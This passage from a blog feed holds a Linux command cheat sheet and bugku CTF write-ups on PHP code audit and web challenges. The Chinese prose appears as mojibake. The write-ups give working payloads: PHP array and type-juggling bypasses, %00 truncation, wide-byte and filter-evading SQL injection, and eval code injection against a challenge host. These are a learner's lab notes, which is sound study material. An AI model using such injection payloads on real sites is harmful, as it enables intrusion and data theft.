plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>åœ¨åå°æ•°æ®åº“ä¸­æŒ‰æ–‡ä»¶åæœç´¢ï¼Œé€Ÿåº¦å¿«<br>/var/lib/mlocate locateå‘½ä»¤æœç´¢çš„åå°æ•°æ®åº“<br><code>updatedb</code> æ›´æ–°æ•°æ®åº“ï¼Œå¦‚æœä¸å¼ºåˆ¶æ›´æ–°çš„è¯å¾—ç­‰ä¸€å¤©ä½ æ–°å»ºçš„ä¸œè¥¿æ‰èƒ½æœç´¢åˆ°</p><h3 id="æœç´¢å‘½ä»¤çš„å‘½ä»¤"><a href="#æœç´¢å‘½ä»¤çš„å‘½ä»¤" class="headerlink" title="æœç´¢å‘½ä»¤çš„å‘½ä»¤"></a>æœç´¢å‘½ä»¤çš„å‘½ä»¤</h3><p><code>whereiså‘½ä»¤</code>  æœç´¢å‘½ä»¤æ‰€åœ¨è·¯å¾„åŠå¸®åŠ©æ–‡æ¡£æ‰€åœ¨ä½ç½®<br>é€‰é¡¹ï¼š  -b åªæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ -m åªæŸ¥æ‰¾å¸®åŠ©æ–‡ä»¶</p><p>ç¯å¢ƒå˜é‡è·¯å¾„å¯ä»¥ç”¨echo $PATHæŸ¥å‡º</p><h3 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h3><p>ä¸¾å‡ ä¸ªä¾‹å­å°±æ‡‚<br><code>find /etc -name init</code>  åœ¨etcç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸ºinit</p><p><code>find  /  -size +204800</code>  åœ¨æ ¹ç›®å½•ä¸‹ä¸‹æŸ¥æ‰¾å¤§äº100MBçš„æ–‡ä»¶</p><p><code>find  / -user sam</code>    åœ¨æ ¹ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰è€…ä¸ºSamçš„æ–‡ä»¶<br>å®¶æœ‰å…¶ä»–ä¸€äº›ä»€ä¹ˆ-ctime å±æ€§å°±ä¸ä¸€ä¸€è®°äº†ï¼Œæˆ‘è§‰å¾—å¸¸ç”¨çš„å°±é‚£å‡ ä¸ª</p><h3 id="å‹ç¼©è§£å‹å‘½ä»¤"><a href="#å‹ç¼©è§£å‹å‘½ä»¤" class="headerlink" title="å‹ç¼©è§£å‹å‘½ä»¤"></a>å‹ç¼©è§£å‹å‘½ä»¤</h3><p>1.å‹ç¼©æˆgzæ–‡ä»¶çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>è§£å‹gzæ–‡ä»¶çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip å‹ç¼©æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>2.å‹ç¼©æˆ.tar.gzæ–‡ä»¶<br><code>tar -zcvf  ç›®å½•</code>        å°†ä¸€ä¸ªç›®å½•æ‰“åŒ…å¹¶å‹ç¼©<br>è§£å‹ç¼©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf   æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶ä»–çš„å‹ç¼©å‘½ä»¤zipä¸unzip,è‡ªè¡Œçœ‹çœ‹å°±å¥½ï¼Œå“¦å¯¹äº†çªç„¶æƒ³èµ·æ¥ä¼ªåŠ å¯†åœ¨Linuxä¸‹é¢å¯ä»¥ç›´æ¥æ‰“å¼€ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h3 id="ç½‘ç»œé€šä¿¡å‘½ä»¤"><a href="#ç½‘ç»œé€šä¿¡å‘½ä»¤" class="headerlink" title="ç½‘ç»œé€šä¿¡å‘½ä»¤"></a>ç½‘ç»œé€šä¿¡å‘½ä»¤</h3><p><code>ping</code>å‘½ä»¤ï¼Œä¸å¤šè¯´ï¼ŒWindowsè·Ÿlinuxéƒ½æœ‰</p><p>æŸ¥çœ‹ç½‘ç»œè®¾ç½®ä¿¡æ¯<br><code>ifconfig</code>   æ³¨æ„ä¸Windowsä¸‹é¢çš„ipconfigå¯¹æ¯”</p><h3 id="ç³»ç»Ÿå‘½ä»¤"><a href="#ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤"></a>ç³»ç»Ÿå‘½ä»¤</h3><p><code>shutdown</code>  å…³æœº<br><code>reboot</code>  é‡å¯<br>ä¸å¤šè¯´ï¼Œè¿™äº›è·ŸWindowsä¸‹é¢éƒ½æ˜¯ä¸€æ ·çš„</p><h1 id="Vimæ–‡æœ¬ç¼–è¾‘å™¨"><a href="#Vimæ–‡æœ¬ç¼–è¾‘å™¨" class="headerlink" title="Vimæ–‡æœ¬ç¼–è¾‘å™¨"></a>Vimæ–‡æœ¬ç¼–è¾‘å™¨</h1><p>å¬è¯´è¿™æ˜¯ä¸€æ¬¾å¼ºå¤§çš„ç¼–è¾‘å™¨ï¼Ÿã€‚ã€‚ã€‚æ²¡æœ‰èœå•åªæœ‰å‘½ä»¤<br><a href="https://imgchr.com/i/CgypMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgypMd.md.png" alt="CgypMd.md.png"></a></p><h2 id="æ’å…¥å‘½ä»¤"><a href="#æ’å…¥å‘½ä»¤" class="headerlink" title="æ’å…¥å‘½ä»¤"></a>æ’å…¥å‘½ä»¤</h2><ol><li><code>a</code> åœ¨å…‰æ ‡åé¢é™„åŠ æ–‡æœ¬</li><li><code>i</code>  åœ¨å…‰æ ‡å‰æ’å…¥æ–‡æœ¬</li><li><code>o</code>  åœ¨å…‰æ ‡ä¸‹æ’å…¥æ–‡æœ¬</li><li><p><code>O</code>  åœ¨å…‰æ ‡ä¸Šæ’å…¥æ–‡æœ¬</p></li><li><p>è¿˜æœ‰å°±æ˜¯ä¸Šä¸‹å·¦å³é”®æ§åˆ¶ä¹Ÿè¡Œ,<code>$</code>ç§»è‡³è¡Œå°¾,<code>0</code>ç§»è‡³è¡Œé¦–</p></li></ol><ol start="6"><li><p><code>D</code> åˆ é™¤å…‰æ ‡å¤„æ‰€åœ¨å¤„åˆ°è¡Œå°¾</p></li><li><p><code>yy</code> å¤åˆ¶å½“å‰è¡Œ,<code>dd</code> å‰ªåˆ‡å½“å‰è¡Œ,<code>p,P</code>  ç²˜è´´,<code>u</code>  å–æ¶ˆä¸Šä¸€æ­¥æ“ä½œ,<code>:wq</code>  ä¿å­˜å¹¶é€€å‡º</p></li></ol><p><code>æ³¨æ„</code>Vimé‡Œé¢çš„å‘½ä»¤éƒ½æ˜¯è¦åœ¨ESCä¹‹åæ‰å¯ä»¥ä½¿ç”¨ã€‚ã€‚ã€‚ã€‚ã€‚</p><h4 id="æœ€è¿‘åœ¨å®¶ç†Ÿæ‚‰ä¸€ä¸‹Linuxå‘½ä»¤ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿˜æœ‰Vimç¼–è¾‘å™¨ï¼Œæˆ‘åªæ˜¯ç®€å•äº†è§£ä¸€ä¸‹ï¼ŒæŠŠæˆ‘è®¤ä¸ºè¦ç»å¸¸ç”¨çš„å‘½ä»¤ï¼Œéƒ½æ€»ç»“ä¸€ä¸‹-å¯èƒ½æœ‰äº›é›¶ç¢ï¼Œæ¯•ç«Ÿæ˜¯è¾¹å­¦è¾¹è®°å½•ã€‚ã€‚ã€‚ã€‚"><a href="#æœ€è¿‘åœ¨å®¶ç†Ÿæ‚‰ä¸€ä¸‹Linuxå‘½ä»¤ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿˜æœ‰Vimç¼–è¾‘å™¨ï¼Œæˆ‘åªæ˜¯ç®€å•äº†è§£ä¸€ä¸‹ï¼ŒæŠŠæˆ‘è®¤ä¸ºè¦ç»å¸¸ç”¨çš„å‘½ä»¤ï¼Œéƒ½æ€»ç»“ä¸€ä¸‹-å¯èƒ½æœ‰äº›é›¶ç¢ï¼Œæ¯•ç«Ÿæ˜¯è¾¹å­¦è¾¹è®°å½•ã€‚ã€‚ã€‚ã€‚" class="headerlink" title="æœ€è¿‘åœ¨å®¶ç†Ÿæ‚‰ä¸€ä¸‹Linuxå‘½ä»¤ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿˜æœ‰Vimç¼–è¾‘å™¨ï¼Œæˆ‘åªæ˜¯ç®€å•äº†è§£ä¸€ä¸‹ï¼ŒæŠŠæˆ‘è®¤ä¸ºè¦ç»å¸¸ç”¨çš„å‘½ä»¤ï¼Œéƒ½æ€»ç»“ä¸€ä¸‹,å¯èƒ½æœ‰äº›é›¶ç¢ï¼Œæ¯•ç«Ÿæ˜¯è¾¹å­¦è¾¹è®°å½•ã€‚ã€‚ã€‚ã€‚"></a>æœ€è¿‘åœ¨å®¶ç†Ÿæ‚‰ä¸€ä¸‹Linuxå‘½ä»¤ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿˜æœ‰Vimç¼–è¾‘å™¨ï¼Œæˆ‘åªæ˜¯ç®€å•äº†è§£ä¸€ä¸‹ï¼ŒæŠŠæˆ‘è®¤ä¸ºè¦ç»å¸¸ç”¨çš„å‘½ä»¤ï¼Œéƒ½æ€»ç»“ä¸€ä¸‹,å¯èƒ½æœ‰äº›é›¶ç¢ï¼Œæ¯•ç«Ÿæ˜¯è¾¹å­¦è¾¹è®°å½•ã€‚ã€‚ã€‚ã€‚</h4>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Linuxå¸¸ç”¨å‘½ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku ä»£ç å®¡è®¡ write up</title>
      <link href="/bugku-php-check.html"/>
      <url>/bugku-php-check.html</url>
      <content type="html"><![CDATA[<p>ä»Šå¤©åšäº†ä¸€æ³¢å®¡è®¡çš„é¢˜ç›®ï¼Œå°±è®°å½•ä¸€ä¸‹å§<br><a id="more"></a></p><h2 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h2><p>æŸ¥ä¸€ä¸‹phpæ‰‹å†Œ</p><p><a href="https://imgchr.com/i/Cgy8iT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgy8iT.md.png" alt="Cgy8iT.md.png"></a><br>æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚<br>è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚<br>è€Œä¸”è¿™ä¸ªå‡½æ•°æ²¡è¿˜æœ‰ä»»ä½•å‚æ•°ï¼Œå¾ˆå±é™©ï¼Œç›´æ¥å¯ä»¥ä¿®æ”¹å†²çªçš„å˜é‡<br><a href="https://imgchr.com/i/CgyJWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgyJWF.md.png" alt="CgyJWF.md.png"></a></p><p>å…³é”®çš„ä»£ç <br><img src="https://s1.ax1x.com/2018/05/20/CgyUy9.png" alt="CgyUy9.png"><br>æ„å»ºçš„payload: <code>?shiyan=&amp;flag=</code><br>å› ä¸ºä¸çŸ¥é“flagé‡Œé¢ä»€ä¹ˆå†…å®¹ï¼Œè®©å®ƒå˜æˆç©ºï¼Œç„¶åä½¿$contentå˜æˆç©ºï¼Œç„¶å$shiyanå˜é‡å’Œ$contentå˜é‡çš„å†…å®¹éƒ½ä¼šè¢«è®¾ç½®æˆç©º. æ»¡è¶³æ¡ä»¶ä¾¿ä¼šå‡ºç°flag</p><h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><p>è¿™é¢˜å…³é”®çš„å‡½æ•°éƒ½æ²¡ç»™å‡ºæ¥ã€‚ã€‚ã€‚é¢˜ç›®è¯´ç”¨strcmpçš„ç‰¹æ€§ã€‚ã€‚ã€‚<br>é‚£æˆ‘å°±éšä¾¿ä¸ªæ•°ç»„è¿›å»ä¸€ä¸ª?a[]â€¦flagå°±å‡ºæ¥äº†ã€‚ã€‚å°´å°¬</p><h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><p>è¿™ä¸ªé¢˜å¥½åƒåœ¨å®éªŒå§åšè¿‡ã€‚ã€‚ã€‚ã€‚ã€‚<br>åˆ©ç”¨äº†ä¸¤æ¬¡urldecodeç¬¬ä¸€æ¬¡æ˜¯æµè§ˆå™¨çš„è§£ç ç¬¬äºŒæ¬¡æ˜¯å‡½æ•°çš„è§£ç <br>æ‰€ä»¥æˆ‘åˆ©ç”¨äº†é‡Œé¢çš„å…¶ä¸­ä¸€ä¸ªå­—æ¯Dç¼–ç ç¬¬ä¸€æ¬¡ç¼–ç æ˜¯%44ï¼Œç¬¬äºŒæ¬¡ç¼–ç æ˜¯%2544<br>payload: <code>?id=hacker%2544J</code></p><h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><p>åˆ©ç”¨phpçš„md5()å‡½æ•°æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œè¿™é‡Œæ˜¯===ï¼Œåªèƒ½ç”¨æ•°ç»„å¤„ç†ï¼Œå®ƒæ— æ³•å¤„ç†æ•°ç»„è¿”å›nullæ„é€ payload: <code>?username[]=1&amp;password[]=2</code></p><h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å›NULLç»•è¿‡"></a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><p>é¦–å…ˆæ˜¯eregè¿™ä¸ªæ­£åˆ™åŒ¹é…å‡½æ•°æ˜¯å¤„ç†å­—ç¬¦ä¸²çš„ã€‚ã€‚ã€‚æ„é€ æ•°ç»„æ˜¯è¿”å›nullï¼Œç„¶åçš„è¯null===false ä¸ç›¸ç­‰å¯ä»¥æ‰§è¡Œä¸‹é¢çš„else ifè¯­å¥ã€‚ã€‚ã€‚<br>strposå¤„ç†æ•°ç»„é¡µæ•°è¿”å›null,äºæ˜¯null!==falseæˆç«‹å°±å¾—åˆ°äº†flag<br>payload: <code>?password[]=1</code></p><h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><p>å…³é”®éƒ¨åˆ†è¿˜æ˜¯===ï¼Œåªèƒ½ç”¨æ•°ç»„å¤„ç†ï¼Œåˆ©ç”¨äº†sha1å‡½æ•°å¤„ç†æ•°ç»„è¿”å›nullçš„ç‰¹æ€§ã€‚<br>payload: <code>?name[]=1&amp;password[]=2</code></p><h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><p>è¿™ä¸€é¢˜é‡Œé¢æ˜¯==ï¼Œç›´æ¥æ‰¾ä¸€ä¸ªMD5ä¹‹åè¿˜æ˜¯0eå¼€å¤´çš„å³å¯ï¼Œæ¯”å¦‚s878926199a<br>payload: <code></code></p><h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><p>ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„â€˜é¦–ä¸ªâ€™å­—ç¬¦çš„ ASCII å€¼ã€‚<br>åˆ©ç”¨è¿™ä¸€ä¸ªä¸é¢˜ç›®çš„16è¿›åˆ¶ï¼Œç”¨16è¿›åˆ¶å¼€å¤´çš„0xå»ç»•è¿‡å³å¯ã€‚ã€‚ã€‚<br>ç”¨Pythonå†™ä¸ªè„šæœ¬è½¬æ¢ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">3735929054</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%##x'</span>%num)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>0xdeadc0de</code><br>payload: <code>?password=0xdeadc0de</code></p><h2 id="eregæ­£åˆ™-00æˆªæ–­"><a href="#eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="eregæ­£åˆ™%00æˆªæ–­"></a>eregæ­£åˆ™%00æˆªæ–­</h2><p>å› ä¸ºeregå­˜åœ¨%00æ¼æ´ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€ä¸ªæ¡ä»¶é‡Œé¢å…ˆæ„å»ºä¸€ä¸ªæˆªæ–­ç»•è¿‡ï¼Œç„¶åå°±å¼€å§‹æ‰§è¡Œä¸‹é¢çš„else ifè¯­å¥ï¼Œé•¿åº¦è¦å°äº8ï¼Œæ•°ç›®è¦å¤§äº9999999ï¼Œè¿™é‡Œå°±ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œç”¨1e8å»ç»•è¿‡<br>ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªstrposå‡½æ•°è¿˜è¦åˆ¤æ–­é‡Œé¢æ˜¯å¦å«æœ‰â€™-â€˜ç¬¦å·ï¼Œæ‰€ä»¥æœ€åçš„payloadåº”è¯¥æ˜¯:?password=1e8%00â€“,å‡ºé”™äº†ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgyaLR.png" alt="CgyaLR.png"><br>æ²¡åŠæ³•åªèƒ½æ‰¾ä¸€ä¸‹åŸé¢˜ï¼Œå‘ç°äººå®¶çš„é¢˜ç›®æ˜¯è¦åŒ…å«<code>*-*</code> ï¼Œä½†æ˜¯ä»–é¢˜ç›®å°±ä¸€æ¡æ¨ªæ ã€‚ã€‚ã€‚å‘äº†ä¸å°‘äººã€‚ã€‚ã€‚<br>æ”¹ä¸€ä¸‹payload: <code>?password=1e8%00*-*</code> ,ç«‹åˆ»å‡ºflag<br>æŸ¥äº†æŸ¥æ‰‹å†Œï¼Œè¿˜æœ‰ä¸ªç±»ä¼¼çš„å‡½æ•°å«eregiï¼Œåªæ˜¯ä¸åˆ¤æ–­å¤§å°å†™ç½¢äº†<br><a href="https://imgchr.com/i/CgyBo6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgyBo6.md.png" alt="CgyBo6.md.png"></a></p><h2 id="strposæ•°ç»„ç»•è¿‡"><a href="#strposæ•°ç»„ç»•è¿‡" class="headerlink" title="strposæ•°ç»„ç»•è¿‡"></a>strposæ•°ç»„ç»•è¿‡</h2><p>è¿™ä¸€é¢˜è·Ÿé‚£é¢˜æ•°ç»„è¿”å›NULLç»•è¿‡ï¼Œæ„Ÿè§‰å¥½åƒæ˜¯ä¸€æ ·çš„ã€‚ã€‚ã€‚ã€‚ã€‚<br>å°±æ˜¯ä¼ å…¥çš„å‚æ•°ä¸ä¸€æ ·äº†ã€‚ã€‚ã€‚ã€‚ã€‚<br>payloadï¼š <code>?ctf[]=1</code></p><p>åæ¥çœ‹äº†çœ‹ä¸‹é¢çš„æ–‡ç« ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•2ï¼šå­—ç¬¦ä¸²æˆªæ–­,åˆ©ç”¨ereg()çš„%00æˆªæ–­æ¼æ´ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤ <code>?nctf=1%00##biubiubiu</code> å‘ç°æ˜¯ä¸€å †ä¹±ç ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/CgyrFK.png" alt="CgyrFK.png">è¿™é‡Œéœ€è¦ç‰¹åˆ«æ³¨æ„ï¼Œ éœ€å°†##ç¼–ç  <code>?nctf=1%00%23biubiubiu</code> æ‰èƒ½å‡ºflagã€‚ã€‚ã€‚ã€‚</p><h2 id="ç»™ä¸€ä¸ªé€‚åˆæ–°æ‰‹çš„å­¦ä¹ æ–‡ç« ï¼š"><a href="#ç»™ä¸€ä¸ªé€‚åˆæ–°æ‰‹çš„å­¦ä¹ æ–‡ç« ï¼š" class="headerlink" title="ç»™ä¸€ä¸ªé€‚åˆæ–°æ‰‹çš„å­¦ä¹ æ–‡ç« ï¼š"></a>ç»™ä¸€ä¸ªé€‚åˆæ–°æ‰‹çš„å­¦ä¹ æ–‡ç« ï¼š</h2><p><a href="http://www.freebuf.com/articles/rookie/152209.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/152209.html</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Web write up</title>
      <link href="/bugku-Web-write-up.html"/>
      <url>/bugku-Web-write-up.html</url>
      <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>view-source:æŸ¥çœ‹æºç å³å¯<br><a id="more"></a></p><h2 id="æ–‡ä»¶ä¸Šä¼ æµ‹è¯•"><a href="#æ–‡ä»¶ä¸Šä¼ æµ‹è¯•" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æµ‹è¯•"></a>æ–‡ä»¶ä¸Šä¼ æµ‹è¯•</h2><p>ä¸Šä¼ ä¸€ä¸ªPHPæ–‡ä»¶å‘ç°ä»–è¦çš„æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼ŒæŠ“åŒ…å…ˆæ”¹ä¸€ä¸‹content-typeä¸ºimage/jpegï¼ŒGoä¸€ä¸‹å‘ç°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg6E01.png" alt="Cg6E01.png"></p><h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>F12è°ƒå‡ºå¼€å‘è€…å·¥å…·ï¼ŒæŠŠmaxlengthæ”¹ä¸ºæ›´é•¿çš„é•¿åº¦å³å¯</p><h2 id="webåŸºç¡€-GET"><a href="#webåŸºç¡€-GET" class="headerlink" title="webåŸºç¡€$_GET"></a>webåŸºç¡€$_GET</h2><p>å®Œå…¨å°±æ˜¯è€ƒphpåŸºç¡€ï¼Œç›´æ¥URLåŠ ä¸Šindex.php?what=flagå³å¯</p><h2 id="webåŸºç¡€-POST"><a href="#webåŸºç¡€-POST" class="headerlink" title="webåŸºç¡€$_POST"></a>webåŸºç¡€$_POST</h2><p>ç”¨Hackbar postæ•°æ®å³å¯</p><h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><p>åˆ©ç”¨äº†==çš„å¼±ç±»å‹ï¼Œç„¶åä»¤num=1eï¼Œgetä¸Šå»å³å¯ç»•è¿‡</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>åœæ­¢ä¹‹åï¼ŒæŸ¥çœ‹æºç ï¼Œæœ€åå‘ç°äº†Htmlçš„ç¼–ç ï¼Œç›´æ¥pythonè·‘ä¸€ä¸‹å³å¯</p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>æŸ¥çœ‹æºç å‘ç°æ˜¯å®½å­—èŠ‚çš„æ³¨å…¥<br><img src="https://s1.ax1x.com/2018/05/20/Cg6mtK.png" alt="Cg6mtK.png"><br>ä»æŠ¥é”™å¯ä»¥çŒœæµ‹è¯­å¥æ˜¯select * from ** where id=â€™inputâ€™<br>æ³¨æ„keyçš„åŒå¼•å·<br>payload:<code>?id=-1%df&#39;union select string,2 from `key` where id=1 --+</code></p><h2 id="SQLæ³¨å…¥1"><a href="#SQLæ³¨å…¥1" class="headerlink" title="SQLæ³¨å…¥1"></a>SQLæ³¨å…¥1</h2><p>ä»£ç é‡Œé¢æ˜¯æ•°å­—å‹çš„æ³¨å…¥<br>æŸ¥çœ‹ä»£ç é‡Œé¢çš„strip_tagså‡½æ•°æ˜¯è¿”å›ç»™å®šçš„å­—ç¬¦ä¸² str å»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å»è¿‡æ»¤<br><img src="https://s1.ax1x.com/2018/05/20/Cg6Q6H.png" alt="Cg6Q6H.png"><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om `key` where id=1--+</span><br></pre></td></tr></table></figure><h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a href="#ä½ å¿…é¡»è®©ä»–åœä¸‹" class="headerlink" title="ä½ å¿…é¡»è®©ä»–åœä¸‹"></a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2><p>æŠ“åŒ…goå‡ ä¸‹å³å¯ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/Cg63nA.png" alt="Cg63nA.png"></p><h2 id="æœ¬åœ°åŒ…å«"><a href="#æœ¬åœ°åŒ…å«" class="headerlink" title="æœ¬åœ°åŒ…å«"></a>æœ¬åœ°åŒ…å«</h2><p>è¯»ä¸€ä¸‹ä»£ç evalå‡½æ•°æ˜¯æ‰§è¡Œä»£ç çš„ï¼Œè€Œvar_dumpå‡½æ•°æ˜¯æŠŠæ‰€æœ‰å˜é‡çš„å±æ€§ç»™æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œflagåœ¨flag.phpé‡Œé¢é‚£ä¹ˆæˆ‘ä»¬å°±æ„é€ fileå‡½æ•°ä¼ å‚ç»™hello<br>payloadï¼š<code>http://120.24.86.145:8003/?hello=file(%27flag.php%27)</code><br>è¿™é¢˜è¿˜æœ‰å…¶ä»–æ–¹æ³•<br>æ¯”å¦‚:<br><code>http://120.24.86.145:8003/?hello=$GLOBALS</code>     åˆ©ç”¨äº†å…¨å±€å˜é‡<br><code>http://120.24.86.145:8003/?hello=);show_source(%27flag.php%27);//</code>    åˆ©ç”¨äº†evalæ‰§è¡Œå‡½æ•°å»é—­åˆvar_dumpå‡½æ•°</p><h2 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h2><p>è¿™é‡Œæœ‰ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ²¡å•¥å½±å“ï¼Œå‘ç°å‡ºç°äº†$$çš„å˜é‡ï¼Œç›´æ¥ç”¨å…¨å±€å˜é‡$GLOBALSå³å¯ï¼Œpayload:?args=GLOBALS,è¿›è€Œæ„é€ å‡ºvar_dump($GLOBALS)<br><img src="https://s1.ax1x.com/2018/05/20/Cg680I.png" alt="Cg680I.png"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>æŸ¥çœ‹æºç å‘ç°æœ‰urlç¼–ç ï¼Œè§£ç åè§‚å¯Ÿä»£ç ï¼Œå‘ç°passwordä¸º67d709b2b54aa2aa648cf6e87a7114f1,æäº¤ä¹‹åå¾—åˆ°key</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>æŸ¥çœ‹æºç å‘ç°é‡Œé¢æœ‰JSfuckï¼Œè§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°flag,è®°çš„æäº¤çš„æ—¶å€™å…¨å¤§å†™ã€‚ã€‚ã€‚ã€‚</p><h2 id="flagåœ¨indexé‡Œ"><a href="#flagåœ¨indexé‡Œ" class="headerlink" title="flagåœ¨indexé‡Œ"></a>flagåœ¨indexé‡Œ</h2><p>è¿›å»ä¹‹åç‚¹å‡»ï¼Œå‘ç°urlä¸Šé¢æœ‰fileå‚æ•°ï¼Œå°±æƒ³åˆ°äº†phpé‡Œé¢çš„fileåè®®ï¼Œç”¨base64è½¬ç æŠŠindex.phpé‡Œé¢çš„å†…å®¹è¯»å‡ºæ¥ï¼Œå†è§£ç ï¼Œå¾—åˆ°flag</p><h2 id="è¾“å…¥å¯†ç æŸ¥çœ‹flag"><a href="#è¾“å…¥å¯†ç æŸ¥çœ‹flag" class="headerlink" title="è¾“å…¥å¯†ç æŸ¥çœ‹flag"></a>è¾“å…¥å¯†ç 